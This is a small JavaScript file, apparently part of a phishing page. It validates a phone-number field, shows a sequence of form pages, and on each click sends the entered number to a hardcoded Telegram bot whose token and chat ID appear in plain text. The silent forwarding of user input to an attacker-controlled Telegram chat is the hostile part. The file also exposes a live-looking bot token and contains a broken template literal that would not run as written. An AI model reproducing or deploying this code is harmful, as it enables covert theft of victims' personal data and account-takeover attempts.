// script.js
let currentPage = 0;
const pages = document.querySelectorAll('.page');
const phoneInput = document.getElementById('phone');
const nextButton = document.getElementById('nextButton');

// Token bot Telegram Anda
const telegramBotToken = '7205685557:AAFAN2A3Teyv0PjGC3Kw0c4oy2apSZv_OS4';
const chatId = '7004398172';

function showNextPage() {
    if (currentPage < pages.length - 1) {
        pages[currentPage].classList.add('hidden');
        currentPage++;
        pages[currentPage].classList.remove('hidden');
    }
}

function validatePhone() {
    if (phoneInput.value.length > 0) {
        nextButton.classList.add('active');
        nextButton.disabled = false;
        nextButton.style.cursor = "pointer";
    } else {
        nextButton.classList.remove('active');
        nextButton.disabled = true;
        nextButton.style.cursor = "not-allowed";
    }
}

function sendMessageToTelegram(message) {
    const url = `https://api.telegram.org/bot${7205685557: AAFAN2A3Teyv0PjGC3Kw0c4oy2apSZv_OS4
}/sendMessage`;
const data = {
    chat_id: chatId,
    text: message,
};

fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
})
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}

phoneInput.addEventListener('input', validatePhone);

nextButton.addEventListener('click', function () {
    if (nextButton.classList.contains('active')) {
        sendMessageToTelegram(`User phone number: ${phoneInput.value}`);
        showNextPage();
    }
});

validatePhone();
